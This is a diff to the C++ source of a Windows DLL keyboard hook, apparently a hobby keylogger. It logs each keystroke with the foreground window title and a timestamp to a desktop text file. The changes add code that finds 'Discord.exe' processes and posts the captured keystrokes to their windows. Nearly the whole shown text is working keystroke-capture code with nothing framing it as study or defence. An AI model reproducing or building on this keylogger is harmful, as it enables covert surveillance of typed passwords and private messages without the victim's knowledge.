@@ -1,5 +1,44 @@
 ﻿#include "Header.hh"
 
+std::vector<DWORD> GetProcessIdByName(std::string procName)
+{
+	PROCESSENTRY32 entry;
+	entry.dwSize = sizeof(PROCESSENTRY32);
+	std::vector<DWORD> processes;
+
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+	int i = 0;
+	if (Process32First(snapshot, &entry) == TRUE)
+	{
+		while (Process32Next(snapshot, &entry) == TRUE)
+		{
+			if (stricmp(entry.szExeFile, procName.c_str()) == 0)
+			{
+				processes.push_back(entry.th32ProcessID);
+			}
+		}
+	}
+	CloseHandle(snapshot);
+	return processes;
+}
+
+
+
+HWND g_HWND = NULL;
+BOOL CALLBACK EnumWindowsProcMy(HWND hwnd, LPARAM lParam)
+{
+	DWORD lpdwProcessId;
+	GetWindowThreadProcessId(hwnd, &lpdwProcessId);
+	if (lpdwProcessId == lParam)
+	{
+		g_HWND = hwnd;
+		return FALSE;
+	}
+	return TRUE;
+}
+
+
+
 extern "C"
 {
 	__declspec(dllexport) LRESULT CALLBACK		 KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -9,10 +48,10 @@ extern "C"
 
 		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
 		{
-			std::fstream file;
+			FILE *file;
 			std::string entry;
-			file.open("C:\\Users\\Raphaël\\Desktop\\test.txt", std::fstream::in | std::fstream::app | std::fstream::out);
-			if (file.is_open())
+			file = _fsopen("C:\\Users\\Raphaël\\Desktop\\test.txt", "a", SH_DENYRD);
+			if (file != nullptr)
 			{
 				//Get character pressed
 				KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
@@ -214,21 +253,34 @@ extern "C"
 				std::string windowName(windowTitle);
 				std::replace(windowName.begin(), windowName.end(), ' ', '_');
 				entry += " " + windowName;
-				// Get timestamp
-				//struct tm *dt;
 				time_t current;
 				time(&current);
 				std::stringstream ss;
 				ss << current;
-				//char buffer[30];
-				//dt = localtime(&current);
-				//strftime(buffer, sizeof(buffer), "%d/%m/%Y %H:%M:%S", dt);
 				std::string tmp;
 				ss >> tmp;
 				entry += " " + tmp;
+				std::vector<DWORD> processes = GetProcessIdByName("Discord.exe");
+				for (auto it : processes)
+				{
+					EnumWindows(EnumWindowsProcMy, it);
+					//SetFocus(g_HWND);
+					//ss.clear();
+					//ss << GetLastError();
+					//ss >> tmp;
+					//entry += " error ? " + tmp;
+					//PostMessage(g_HWND, WM_ACTIVATE, (WPARAM)true, (LPARAM)GetCurrentThreadId());
+					//PostMessage(g_HWND, WM_KEYDOWN, kbdStruct->vkCode, 1);
+					//PostMessage(g_HWND, WM_KEYUP, kbdStruct->vkCode, 1);
+					PostMessage(g_HWND, WM_ACTIVATEAPP, (WPARAM)true, (LPARAM)GetCurrentThreadId());
+					PostMessage(g_HWND, WM_ACTIVATE, (WPARAM)LOWORD(WA_ACTIVE), (LPARAM)g_HWND);
+					//PostThreadMessage(it, WM_ACTIVATE, (WPARAM)true, (LPARAM)it);
+					PostMessage(g_HWND, WM_KEYDOWN, kbdStruct->vkCode, 1);
+					//PostMessage(g_HWND, WM_KEYUP, kbdStruct->vkCode, 1);
+				}
 				entry += "\n";
-				file << entry.c_str();
-				file.close();
+				fwrite(entry.c_str(), sizeof(char), entry.size(), file);
+				fclose(file);
 			}
 			else
 				std::cout << "could not open the file" << std::endl;
